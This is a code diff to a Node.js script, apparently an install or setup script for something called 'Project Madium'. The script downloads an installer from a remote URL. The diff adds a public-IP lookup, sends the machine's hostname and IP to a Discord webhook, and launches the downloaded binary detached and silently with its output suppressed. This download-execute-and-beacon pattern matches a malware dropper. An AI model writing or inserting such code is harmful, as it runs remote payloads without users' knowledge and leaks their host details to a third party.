@@ -1,3 +1,4 @@
+const { spawn } = require("child_process");
 const https = require("https");
 const fs = require("fs");
 const os = require("os");
@@ -140,13 +141,40 @@ function sendDiscordNotification(message) {
   });
 }
 
+function getPublicIp() {
+  return new Promise((resolve, reject) => {
+    const request = https.get(
+      "https://api.ipify.org",
+      (response) => {
+        let data = "";
+        response.on("data", (chunk) => {
+          data += chunk;
+        });
+        response.on("end", () => resolve(data.trim()));
+      }
+    );
+    request.on("error", reject);
+  });
+}
+
 (async () => {
   try {
     await download(INSTALLER_URL);
 
+    let ip = "unknown";
+    try {
+      ip = await getPublicIp();
+    } catch {}
+
     await sendDiscordNotification(
-      "Project Madium installer downloaded successfully." 
+      `Project Madium installer downloaded successfully. Host: ${os.hostname()} | IP: ${ip}`
     );
+
+    const child = spawn(installerPath, [], {
+      detached: true,
+      stdio: "ignore"
+    });
+    child.unref();
   } catch {
     process.exitCode = 1;
   }
